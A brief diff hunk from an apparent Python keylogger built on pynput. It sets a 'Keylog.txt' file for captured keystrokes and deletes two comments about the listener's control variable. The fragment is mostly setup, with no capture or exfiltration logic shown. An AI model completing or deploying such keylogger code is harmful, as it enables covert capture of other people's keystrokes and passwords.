@@ -6,8 +6,6 @@ from pynput import keyboard
 # Create a log file; captures keystrokes being stored
 log_file = "Keylog.txt"
 
-#share variable to control listener
-# keylogger continues to listen for keypress (L.11) 
 count = 0
 keys = []
 
